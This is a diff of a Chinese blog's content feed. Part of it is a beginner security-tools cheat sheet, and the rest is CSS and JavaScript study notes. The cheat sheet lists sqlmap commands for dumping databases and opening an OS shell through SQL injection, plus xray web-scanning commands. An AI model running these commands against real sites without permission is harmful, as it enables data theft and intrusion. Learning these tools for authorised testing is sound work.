+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-proxy socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure>
+
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>SQL注入检测工具</p>
+<h3 id="常用参数-1"><a href="#常用参数-1" class="headerlink" title="常用参数"></a>常用参数</h3><p>判断注入是否存在</p>
+<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jsp?id=1">www.xxx.com/user.jsp?id=1</a>“<br></p>
+<p>直接加载数据包测试</p>
+<p>sqlmap.py -r head.txt –dbs  &#x2F;&#x2F;head.txt 内容为 HTTP 请求<br></p>
+<p>获取数据库</p>
+<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jsp?id=1">www.xxx.com/user.jsp?id=1</a>“ –dbs<br></p>
+<p>查看当前应用程序所用数据库</p>
+<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jsp?id=1">www.xxx.com/user.jsp?id=1</a>“ –current-db<br></p>
+<p>列出指定数据库的所有表</p>
+<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jsp?id=1">www.xxx.com/user.jsp?id=1</a>“ –table -D “数据库”</p>
+<p>读取指定表中的字段名称</p>
+<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jsp?id=1">www.xxx.com/user.jsp?id=1</a>“ –columns -T “数据表” -D “数据库”</p>
+<p>读取指定字段内容</p>
+<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jspid=1">www.xxx.com/user.jspid=1</a>“ –dump -C”字段” -T “数据表” -D “数据库”</p>
+<p>执行Shell命令</p>
+<p>sqlmap.py -u “URL” –os-cmd&#x3D;”net user”  &#x2F;&#x2F;执行 net user 命令</p>
+<p>sqlmap.py -u “URL” –os-shell  &#x2F;&#x2F;系统交互的shell</p>
+<p>POST提交方式</p>
+<p>sqlmap.py -u “URL” –data “POST参数”</p>
+<p>显示详细的等级</p>
+<p>sqlmap.py -u “URL” –dbs -v 1</p>
+<p>-v 参数包含以下7个等级。</p>
+<p>·0：只显示Python的回溯、错误和关键消息；</p>
+<p>·1：显示信息和警告信息；</p>
+<p>·2：显示调试信息；</p>
+<p>·3：有效载荷注入；</p>
+<p>·4：显示HTTP请求；</p>
+<p>·5：显示HTTP响应头；</p>
+<p>·6：显示HTTP响应页面的内容。</p>
+<p>注入等级</p>
+<p>sqlmap.py -u “URL” –level 3</p>
+<p><br>将注入语句插入到指定位置（常用于伪静态注入）</p>
+<p>sqlmap.py -u “<a href="http://www.xxx.com/id/2//*.html">http://www.xxx.com/id/2\\*.html</a>“ –dbs</p>
+<p>使用 Sqlmap 插件</p>
+<p>sqlmap.py -u “URL” –tamper “space2morehash.py”</p>
+<h2 id="TscanPlus"><a href="#TscanPlus" class="headerlink" title="TscanPlus"></a>TscanPlus</h2><p>一款综合性网络安全检测和运维工具，旨在快速资产发现、识别、检测，构建基础资产信息库，协助甲方安全团队或者安全运维人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</p>
+<figure><img src="https://2843206953-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuQdEIFRPpmirHXN97b5y%2Fuploads%2Fvvwwpaj2jg7PsiZMyzg6%2Fimage.png?alt=media&#x26;token=3984e4e2-e6e0-4dcd-82a4-ec55d3df11ca" alt=""><figcaption></figcaption></figure>
+
+<h2 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h2><p>一款长亭自研的完善的安全评估工具，支持常见 web 安全问题扫描和自定义 poc | 使用之前务必先阅读文档</p>
+<p>使用基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray webscan --basic-crawler http://example.com --html-output vuln.html</span><br></pre></td></tr></table></figure>
+
+<p>使用 HTTP 代理进行被动扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure>
+
+<p>设置浏览器 http 代理为 <code>http://127.0.0.1:7777</code>，就可以自动分析代理流量并扫描。</p>
+<p>只扫描单个 url，不使用爬虫</p>
+<p>xray webscan –url <a href="http://example.com/?a=b">http://example.com/?a=b</a> –html-output single-url.html</p>
 ]]></content>
       <categories>
         <category>网络安全</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>网络安全</tag>
         <tag>新手教程</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>CSS笔记</title>
-    <url>/2022/12/26/17-58-14/</url>
-    <content><![CDATA[<h1 id="1-什么是CSS"><a href="#1-什么是CSS" class="headerlink" title="1,什么是CSS"></a>1,什么是CSS</h1><hr>
-<p>CSS指的是层叠样式表，一种用来表现HTML或XML等文件样式的计算机语言，是可以做到网页和内容进行分离的样式语言。作用是：可以有效地对页面的布局、字体、颜色、背景和其它效果实现更加精确的控制；使页面的字体变得更漂亮，更容易编排。</p>
-<span id="more"></span>
-<h1 id="2-选择器"><a href="#2-选择器" class="headerlink" title="2,选择器"></a>2,选择器</h1><hr>
-<h4 id="1-xxx选择器"><a href="#1-xxx选择器" class="headerlink" title="1.xxx选择器"></a>1.xxx选择器</h4><h4 id="2-xxx选择器"><a href="#2-xxx选择器" class="headerlink" title="2.xxx选择器"></a>2.xxx选择器</h4><h4 id="3-xxx选择器"><a href="#3-xxx选择器" class="headerlink" title="3.xxx选择器"></a>3.xxx选择器</h4><h4 id="4-root根选择器"><a href="#4-root根选择器" class="headerlink" title="4.root根选择器"></a>4.root根选择器</h4><p><strong>root选择器用于选择文档的根元素。根元素指的是位于文档树中最顶层结构的元素。在HTML中，根元素永远是HTML，更改全局</strong></p>
-<h1 id="3-美化网页元素"><a href="#3-美化网页元素" class="headerlink" title="3,美化网页元素"></a>3,美化网页元素</h1><hr>
-<h2 id="3-1为什么要美化网页"><a href="#3-1为什么要美化网页" class="headerlink" title="3.1为什么要美化网页"></a>3.1为什么要美化网页</h2><p>1、有效的传递页面信息</p>
-<p>2、美化网页，页面漂亮，才能吸引用户</p>
-<p>3、凸显页面主题</p>
-<p> &lt;<code>script` `src</code>&#x3D;<code>&quot;js/index.js&quot;` `type</code>&#x3D;<code>&quot;text/javascript&quot;</code>&gt;&lt;&#x2F;<code>script</code>&gt;html</p>
-<h2 id="3-2字体样式"><a href="#3-2字体样式" class="headerlink" title="3.2字体样式"></a>3.2字体样式</h2><p><strong>span</strong>标签：重点要突出的字，使用<strong>span</strong>套起来 （span可以换成别的名字，为了规范用span）</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-id">#title1</span>&#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>:<span class="number">50px</span></span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;title1&quot;</span>&gt;</span>欢迎你<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>本代码会将<strong>欢迎你</strong>改为50px的字体大小</p>
-<p><strong>font-family：</strong>想要的字体; 可以改变所选属性的字体</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">	<span class="selector-tag">body</span>&#123;<span class="attribute">font-family</span>:楷体;&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>嘿嘿<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>嘻嘻<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>本代码会将body标签里所有的字改为楷体</p>
-<p><strong>font-weight:粗细</strong> 可以改变字体粗细 </p>
-<p>粗细那可以填的：   <strong>bold</strong> 粗的    <strong>colder</strong>更粗的   <strong>lighter</strong>更细的    <strong>normal</strong>正常的 数字 等等</p>
-<p><strong>font-size: px</strong> 改变字体大小（单位px像素  如20px）（单位em 1em &#x3D; 16px）</p>
-<p><strong>color：颜色</strong> 改变字体颜色</p>
-<p>还有这种办法 <strong>font：字体样式（如斜体）  粗细程度  大小  字体</strong></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">	<span class="selector-tag">p</span>&#123;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">font</span>:oblique bolder <span class="number">20px</span> <span class="string">&quot;楷体&quot;</span>;</span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>嘿嘿<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>将p标签的字改为 <strong>倾斜 加粗 20px大小 楷体</strong></p>
-<h2 id="3-3文本样式"><a href="#3-3文本样式" class="headerlink" title="3.3文本样式"></a>3.3文本样式</h2><h3 id="1、颜色"><a href="#1、颜色" class="headerlink" title="1、颜色"></a>1、颜色</h3><p><strong>分为  ;</strong> 单词(如red)  RGB(0<del>F)    RGBA（在RGB基础上可以设置透明度0</del>1）</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">h1</span>&#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>:<span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.50</span>)；</span></span><br><span class="line"><span class="language-css">        text-align：center; 将文本居中</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>以上代码将标签h1的文字颜色改为所选 透明度为0.5</p>
-<h3 id="2、文本对齐的方式"><a href="#2、文本对齐的方式" class="headerlink" title="2、文本对齐的方式"></a>2、文本对齐的方式</h3><p>  <strong>text-align : center;</strong> 将文本居中(见上方代码如何使用)</p>
-<p>在代码中也可以用这些进行对其</p>
-<p><strong>&amp;nbsp</strong> 半角的不断行的空白格（推荐使用）</p>
-<p><strong>&amp;ensp</strong> 半角的空格</p>
-<p><strong>&amp;emsp</strong> 全角的空格</p>
-<h3 id="3、首行缩进"><a href="#3、首行缩进" class="headerlink" title="3、首行缩进"></a>3、首行缩进</h3><p><strong>text-indent: em</strong>   段落首行缩进建议用em作为单位 px是像素太小了</p>
-<h3 id="4、行高"><a href="#4、行高" class="headerlink" title="4、行高"></a>4、行高</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">p</span>&#123;</span></span><br><span class="line"><span class="language-css">	<span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">	<span class="attribute">line-height</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>height: 300px;</strong> 设置本标签块的高度是300px（可以用<strong>background</strong>给本标签块设置个背景颜色方便看多大）<br><strong>line-height: 10px;</strong>  2行字之间的间距为10px （可以用这个与字体的高度对其）</p>
-<h3 id="5、装饰"><a href="#5、装饰" class="headerlink" title="5、装饰"></a>5、装饰</h3><p><strong>border-radius:10px;</strong> 讲背景边角变圆润</p>
-<h4 id="5-1-划线"><a href="#5-1-划线" class="headerlink" title="5.1 划线"></a>5.1 划线</h4><p>​			<strong>text-decoration : underline;</strong> 给字体设置一个下划线  </p>
-<p>​			将 <strong>underline改为line-through</strong>就是在文本添加一个中划线</p>
-<p>​			将 <strong>underline改为overline</strong>就是在文本添加一个上划线   none去掉划线		</p>
-<h4 id="5-2-文本图片水平对其"><a href="#5-2-文本图片水平对其" class="headerlink" title="5.2 文本图片水平对其"></a>5.2 文本图片水平对其</h4><p><strong>vertical-align : middle;</strong>  </p>
-<h3 id="6、文本阴影和超链接伪类"><a href="#6、文本阴影和超链接伪类" class="headerlink" title="6、文本阴影和超链接伪类"></a>6、文本阴影和超链接伪类</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">	<span class="selector-class">.a1</span>&#123;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">height</span>: <span class="number">125px</span>;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">width</span>: <span class="number">125px</span>;</span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css">	<span class="selector-class">.a3</span>&#123;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css"><span class="comment">/*		去除下划线*/</span></span></span><br><span class="line"><span class="language-css">		<span class="attribute">background</span>: <span class="number">#9AC41A</span>;</span></span><br><span class="line"><span class="language-css"><span class="comment">/*		设置背景颜色*/</span></span></span><br><span class="line"><span class="language-css">		<span class="attribute">border-radius</span>:<span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css"><span class="comment">/*		讲背景边角变圆润*/</span></span></span><br><span class="line"><span class="language-css">		<span class="attribute">font-size</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="language-css"><span class="comment">/*		设置字体大小*/</span></span></span><br><span class="line"><span class="language-css">		<span class="attribute">color</span>: <span class="number">#3205FF</span>;</span></span><br><span class="line"><span class="language-css">		<span class="comment">/*		设置字体颜色*/</span></span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css">	<span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="language-css">		<span class="attribute">color</span>: orange;</span></span><br><span class="line"><span class="language-css"><span class="comment">/*		鼠标悬浮到此处 将颜色改为orange*/</span></span></span><br><span class="line"><span class="language-css">	&#125;</span></span><br><span class="line"><span class="language-css">	</span></span><br><span class="line"><span class="language-css">	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="小重点-超链接伪类"><a href="#小重点-超链接伪类" class="headerlink" title="*小重点 超链接伪类"></a>*小重点 超链接伪类</h3><p><strong>a:hover  {   color: orange;  （后面可以添加属性如文字放大）}</strong><br>鼠标悬浮到此处 将颜色改为orange</p>
-<p><strong>a:active  {  color: aqua;  }</strong><br>鼠标按住此处未释放时  将颜色改为aqua</p>
-<p><strong>a:visited  { color:颜色；}</strong><br>已经访问过的超链接将会运用这个属性 将颜色改为所选</p>
-<p><strong>a:link;{color:颜色；}</strong><br>没有访问过的超链接会使用这个属性 将颜色改为所选</p>
-<h3 id="7-文本阴影"><a href="#7-文本阴影" class="headerlink" title="7.文本阴影"></a>7.<strong>文本阴影</strong></h3><p>text-shadow: 颜色 水平偏移 垂直偏移 阴影半径</p>
-<p>（貌似只支持纯文本）</p>
-<p>无序列表前段圆圈：<br>list-style:<br>    none 去掉圆点<br>    circle 设置为空心圆<br>    decimal 数字<br>    square 正方形</p>
-<h2 id="3-4-table表格"><a href="#3-4-table表格" class="headerlink" title="3.4 table表格"></a>3.4 table表格</h2><h4 id="1-0-关键词"><a href="#1-0-关键词" class="headerlink" title="1.0 关键词"></a><strong>1.0</strong> <strong>关键词</strong></h4><p><strong>table 表格元素</strong><br><strong>border</strong>边框元素<br><strong>tr</strong>  定义表格一行<br><strong>th</strong> 元素定义表头<br><strong>td</strong> 元素定义表格单元<br><strong>rowspan</strong> 行合并<br><strong>colspan</strong> 列合并</p>
-<h2 id="3-5-cursor（鼠标样式）"><a href="#3-5-cursor（鼠标样式）" class="headerlink" title="3.5 cursor（鼠标样式）"></a>3.5 cursor（鼠标样式）</h2><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><table>
-<thead>
-<tr>
-<th><strong>auto</strong></th>
-<th></th>
-<th><strong>默认值，由浏览器根据当前上下文确定要显示的光标样式</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>default</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S0N27-0.gif" alt="默认光标"></strong></td>
-<td><strong>默认光标，不考虑上下文，通常是一个箭头</strong></td>
-</tr>
-<tr>
-<td><strong>none</strong></td>
-<td></td>
-<td><strong>不显示光标</strong></td>
-</tr>
-<tr>
-<td><strong>initial</strong></td>
-<td></td>
-<td><strong>将此属性设置为其默认值</strong></td>
-</tr>
-<tr>
-<td><strong>inherit</strong></td>
-<td></td>
-<td><strong>从父元素基础 cursor 属性的值</strong></td>
-</tr>
-<tr>
-<td><strong>context-menu</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S052A-1.gif" alt="上下文菜单光标"></strong></td>
-<td><strong>表示上下文菜单可用</strong></td>
-</tr>
-<tr>
-<td><strong>help</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S05W2-2.gif" alt="帮助光标"></strong></td>
-<td><strong>表示有帮助</strong></td>
-</tr>
-<tr>
-<td><strong>pointer</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S045S-3.gif" alt="指针光标"></strong></td>
-<td><strong>表示一个链接</strong></td>
-</tr>
-<tr>
-<td><strong>progress</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S04130-4.gif" alt="进度游标"></strong></td>
-<td><strong>进度指示器，表示程序正在执行一些处理，但是您仍然可以在该界面进行一些操作（与 wait 不同）</strong></td>
-</tr>
-<tr>
-<td><strong>wait</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S01548-5.gif" alt="等待光标"></strong></td>
-<td><strong>表示程序繁忙，您应该等待程序指向完成</strong></td>
-</tr>
-<tr>
-<td><strong>cell</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S050C-6.gif" alt="单元游标"></strong></td>
-<td><strong>表示可以选择一个单元格（或一组单元格）</strong></td>
-</tr>
-<tr>
-<td><strong>crosshair</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S03P6-7.gif" alt="十字准线光标"></strong></td>
-<td><strong>一个简单的十字准线</strong></td>
-</tr>
-<tr>
-<td><strong>text</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S0O53-8.gif" alt="文字游标"></strong></td>
-<td><strong>表示可以选择的文本</strong></td>
-</tr>
-<tr>
-<td><strong>vertical-text</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S03J2-9.gif" alt="垂直文本光标"></strong></td>
-<td><strong>表示可以选择的垂直文本</strong></td>
-</tr>
-<tr>
-<td><strong>alias</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S031L-10.gif" alt="别名光标"></strong></td>
-<td><strong>表示要创建别名或快捷方式</strong></td>
-</tr>
-<tr>
-<td><strong>copy</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S032P-11.gif" alt="复制光标"></strong></td>
-<td><strong>表示可以复制某些内容</strong></td>
-</tr>
-<tr>
-<td><strong>move</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S06019-12.gif" alt="移动光标"></strong></td>
-<td><strong>表示可以移动鼠标下方的对象</strong></td>
-</tr>
-<tr>
-<td><strong>no-drop</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S04022-13.gif" alt="无丢游标"></strong></td>
-<td><strong>表示所拖动的项目不能放置在当前位置</strong></td>
-</tr>
-<tr>
-<td><strong>not-allowed</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S01915-14.gif" alt="不允许的游标"></strong></td>
-<td><strong>表示无法完成某事</strong></td>
-</tr>
-<tr>
-<td><strong>all-scroll</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S03556-15.gif" alt="全滚动光标"></strong></td>
-<td><strong>表示对象可以沿任何方向滚动（平移）</strong></td>
-</tr>
-<tr>
-<td><strong>col-resize</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S02507-16.gif" alt="彩色游标"></strong></td>
-<td><strong>表示可以水平调整列的大小</strong></td>
-</tr>
-<tr>
-<td><strong>row-resize</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S03460-17.gif" alt="行大小调整游标"></strong></td>
-<td><strong>表示可以垂直调整行的大小</strong></td>
-</tr>
-<tr>
-<td><strong>n-resize</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S0B57-18.gif" alt="N尺寸游标"></strong></td>
-<td><strong>表示对象的边缘可以向上（向北）移动</strong></td>
-</tr>
-<tr>
-<td><strong>e-resize</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S05555-19.gif" alt="电子调整游标"></strong></td>
-<td><strong>表示对象的边缘可以向右（向东）移动</strong></td>
-</tr>
-<tr>
-<td><strong>s-resize</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S023U-20.gif" alt="S调整游标"></strong></td>
-<td><strong>表示对象的边缘可以向下（向南）移动</strong></td>
-</tr>
-<tr>
-<td><strong>w-resize</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S05b3-21.gif" alt="W尺寸游标"></strong></td>
-<td><strong>表示对象的边缘可以向左（向西）移动</strong></td>
-</tr>
-<tr>
-<td><strong>ne-resize</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S064O-22.gif" alt="NE调整大小的游标"></strong></td>
-<td><strong>表示对象的边缘可以向上和向右（北&#x2F;东）移动</strong></td>
-</tr>
-<tr>
-<td><strong>nw-resize</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S01250-23.gif" alt="NW调整游标"></strong></td>
-<td><strong>表示对象的边缘可以向上和向左（北&#x2F;西）移动</strong></td>
-</tr>
-<tr>
-<td><strong>se-resize</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S01212-24.gif" alt="SE调整游标"></strong></td>
-<td><strong>表示对象的边缘可以向下和向右（向南&#x2F;向东）移动</strong></td>
-</tr>
-<tr>
-<td><strong>sw-resize</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S04439-25.gif" alt="SW调整游标"></strong></td>
-<td><strong>表示对象的边缘可以向下和向左（南&#x2F;西）移动</strong></td>
-</tr>
-<tr>
-<td><strong>ew-resize</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S033E-26.gif" alt="EW调整游标"></strong></td>
-<td><strong>表示可以双向调整对象大小的光标</strong></td>
-</tr>
-<tr>
-<td><strong>ns-resize</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S05346-27.gif" alt="NS调整大小的游标"></strong></td>
-<td></td>
-</tr>
-<tr>
-<td><strong>nesw-resize</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S044L-28.gif" alt="NESW调整大小的游标"></strong></td>
-<td></td>
-</tr>
-<tr>
-<td><strong>nwse-resize</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S033B-29.gif" alt="NWSE调整大小的游标"></strong></td>
-<td></td>
-</tr>
-<tr>
-<td><strong>zoom-in</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S05K0-30.gif" alt="放大光标"></strong></td>
-<td><strong>表示可以放大某些内容</strong></td>
-</tr>
-<tr>
-<td><strong>zoom-out</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S05118-31.gif" alt="缩小光标"></strong></td>
-<td><strong>表示可以缩小某些内容</strong></td>
-</tr>
-<tr>
-<td><strong>grab</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S03b0-32.gif" alt="抓取光标"></strong></td>
-<td><strong>表示可以抓取（拖动）某些东西</strong></td>
-</tr>
-<tr>
-<td><strong>grabbing</strong></td>
-<td><strong><img src="http://c.biancheng.net/uploads/allimg/210806/150S05K4-33.gif" alt="抓取光标"></strong></td>
-<td><strong>表示已经抓取到某些东西</strong></td>
-</tr>
-<tr>
-<td><strong>url(“ “)</strong></td>
-<td>****</td>
-<td><strong>自定义光标的样式，括号中的内容为光标图像的源文件路径</strong></td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>前端开发</category>
-      </categories>
   </entry>
   <entry>
     <title>CTF入门工具合集</title>
@@ -2127,46 +2207,261 @@
       </tags>
   </entry>
   <entry>
-    <title>JavaScript笔记</title>
-    <url>/2023/01/09/09-13-37/</url>
-    <content><![CDATA[<h1 id="1，什么是JavaScript"><a href="#1，什么是JavaScript" class="headerlink" title="1，什么是JavaScript"></a>1，什么是JavaScript</h1><p>JavaScript 是一种脚本，一门编程语言，它可以在网页上实现复杂的功能，网页展现给你的不再是简单的静态信息，而是实时的内容更新，交互式的地图，2D&#x2F;3D 动画，滚动播放的视频等等。JavaScript 怎能缺席。它是标准 Web 技术蛋糕的第三层</p>
+    <title>CSS笔记</title>
+    <url>/2022/12/26/17-58-14/</url>
+    <content><![CDATA[<h1 id="1-什么是CSS"><a href="#1-什么是CSS" class="headerlink" title="1,什么是CSS"></a>1,什么是CSS</h1><hr>
+<p>CSS指的是层叠样式表，一种用来表现HTML或XML等文件样式的计算机语言，是可以做到网页和内容进行分离的样式语言。作用是：可以有效地对页面的布局、字体、颜色、背景和其它效果实现更加精确的控制；使页面的字体变得更漂亮，更容易编排。</p>
 <span id="more"></span>
+<h1 id="2-选择器"><a href="#2-选择器" class="headerlink" title="2,选择器"></a>2,选择器</h1><hr>
+<h4 id="1-xxx选择器"><a href="#1-xxx选择器" class="headerlink" title="1.xxx选择器"></a>1.xxx选择器</h4><h4 id="2-xxx选择器"><a href="#2-xxx选择器" class="headerlink" title="2.xxx选择器"></a>2.xxx选择器</h4><h4 id="3-xxx选择器"><a href="#3-xxx选择器" class="headerlink" title="3.xxx选择器"></a>3.xxx选择器</h4><h4 id="4-root根选择器"><a href="#4-root根选择器" class="headerlink" title="4.root根选择器"></a>4.root根选择器</h4><p><strong>root选择器用于选择文档的根元素。根元素指的是位于文档树中最顶层结构的元素。在HTML中，根元素永远是HTML，更改全局</strong></p>
+<h1 id="3-美化网页元素"><a href="#3-美化网页元素" class="headerlink" title="3,美化网页元素"></a>3,美化网页元素</h1><hr>
+<h2 id="3-1为什么要美化网页"><a href="#3-1为什么要美化网页" class="headerlink" title="3.1为什么要美化网页"></a>3.1为什么要美化网页</h2><p>1、有效的传递页面信息</p>
+<p>2、美化网页，页面漂亮，才能吸引用户</p>
+<p>3、凸显页面主题</p>
+<p> &lt;<code>script` `src</code>&#x3D;<code>&quot;js/index.js&quot;` `type</code>&#x3D;<code>&quot;text/javascript&quot;</code>&gt;&lt;&#x2F;<code>script</code>&gt;html</p>
+<h2 id="3-2字体样式"><a href="#3-2字体样式" class="headerlink" title="3.2字体样式"></a>3.2字体样式</h2><p><strong>span</strong>标签：重点要突出的字，使用<strong>span</strong>套起来 （span可以换成别的名字，为了规范用span）</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-id">#title1</span>&#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>:<span class="number">50px</span></span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;title1&quot;</span>&gt;</span>欢迎你<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h1 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h1><p><strong>截止到1.7号</strong></p>
-<p><strong>9.24前学习到了p8课程</strong> <strong>（4%进度）</strong></p>
-<p><strong>9.25学习p9.p10.p11</strong> <strong>（5.5%进度）</strong></p>
-<p><strong>9.29学习到p14（7%）</strong></p>
-<p><strong>10.1学习到p18（9%）</strong></p>
-<h1 id="2，HTML中引用JavaScript"><a href="#2，HTML中引用JavaScript" class="headerlink" title="2，HTML中引用JavaScript"></a>2，HTML中引用JavaScript</h1><p><strong>1.html中页面的头部引用js</strong></p>
-<p>就是在头部<head></head>之前内进行编写js。代码如下：</p>
